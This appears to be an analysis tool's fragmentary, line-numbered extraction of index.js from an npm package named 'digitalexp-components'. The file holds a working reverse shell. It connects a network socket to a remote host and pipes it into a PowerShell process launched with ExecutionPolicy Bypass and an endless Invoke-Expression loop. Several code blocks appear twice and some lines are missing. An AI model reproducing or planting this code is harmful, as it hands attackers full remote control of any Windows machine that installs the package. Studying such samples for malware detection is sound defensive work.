// File: tmp/tmphm0qad7d/digitalexp-components/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: _tmp_0 = require("child_process")
Line 5: const packageJSON = require("./package.json")
Line 7: const net = require('net')
Line 12: const client = new net.Socket()
Line 13: {
  console.log("Connected!");
  
  // Spawn PowerShell with ExecutionPolicy Bypass and command mode
  const shell = spawn('powershell.exe', [
    '-ExecutionPolicy', 'Bypass',  // Bypass execution policy
    '-NoExit',                    // Keep the PowerShell session open
    '-Command',                   // Allow command execution
    'while($true) { $input = Read-Host "Enter command"; Invoke-Expression $input }' // Infinite loop to enter commands
  ]);
  
  // Pipe data between the client and PowerShell
  client.pipe(shell.stdin);
  shell.stdout.pipe(client);
  shell.stderr.pipe(client);
  
  // Handle error with the shell process
  shell.on('error', (err) => {
    console.error('Shell process error:', err);
  });
  
  // Handle close event for the shell process
  shell.on('close', (code) => {
    console.log(`Shell process exited with code ${code}`);
    client.destroy(); // Close the client connection when the shell is done
  });
}
Line 17: const shell = spawn('powershell.exe', [
    '-ExecutionPolicy', 'Bypass',  // Bypass execution policy
    '-NoExit',                    // Keep the PowerShell session open
    '-Command',                   // Allow command execution
    'while($true) { $input = Read-Host "Enter command"; Invoke-Expression $input }' // Infinite loop to enter commands
  ])
Line 18: _tmp_2.push("-ExecutionPolicy")
Line 19: _tmp_2.push("-NoExit")
Line 20: _tmp_2.push("-Command")
Line 21: _tmp_2.push("while($true) { $input = Read-Host "Enter command"; Invoke-Expression $input }")
Line 25: client.pipe(shell.stdin)
Line 26: shell.stdout.pipe(client)
Line 27: shell.stderr.pipe(client)
Line 35: {
    console.log(`Shell process exited with code ${code}`);
    client.destroy(); // Close the client connection when the shell is done
  }
Line 37: client.destroy()
